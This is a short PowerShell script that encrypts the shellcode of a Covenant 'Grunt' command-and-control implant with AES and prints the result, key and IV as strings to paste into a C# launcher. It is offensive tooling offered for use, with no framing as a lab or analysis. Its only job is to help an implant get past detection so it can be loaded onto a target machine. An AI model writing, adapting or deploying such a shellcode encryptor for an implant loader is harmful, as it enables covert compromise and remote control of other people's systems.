# encrypt-shellcode.ps1
# Usage: .\encrypt-shellcode.ps1 -ShellcodePath .\GruntHTTP.bin.b64

param([string]$ShellcodePath)

$sc_b64 = Get-Content $ShellcodePath -Raw
$sc = [Convert]::FromBase64String($sc_b64.Trim())

# Per Covenant grunt: use RijndaelManaged
$aes = New-Object System.Security.Cryptography.RijndaelManaged
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Per grunt: random key and IV
$aes.GenerateKey()
$aes.GenerateIV()

$encryptor = $aes.CreateEncryptor()
$encrypted = $encryptor.TransformFinalBlock($sc, 0, $sc.Length)

# Per grunt: output as base64
$enc_b64 = [Convert]::ToBase64String($encrypted)
$key_b64 = [Convert]::ToBase64String($aes.Key)
$iv_b64  = [Convert]::ToBase64String($aes.IV)

Write-Host "`n=== COVENANT GRUNT ENCRYPTED SHELLCODE ===" -ForegroundColor Green
Write-Host "`nEncrypted shellcode (base64):" -ForegroundColor Yellow
Write-Host $enc_b64
Write-Host "`nKey (base64):" -ForegroundColor Yellow
Write-Host $key_b64
Write-Host "`nIV (base64):" -ForegroundColor Yellow
Write-Host $iv_b64

Write-Host "`n=== ADD TO C# LAUNCHER ===" -ForegroundColor Green
Write-Host @"
string gruntx64 = "$enc_b64";
string gruntKey = "$key_b64";
string gruntIV  = "$iv_b64";
"@ -ForegroundColor Cyan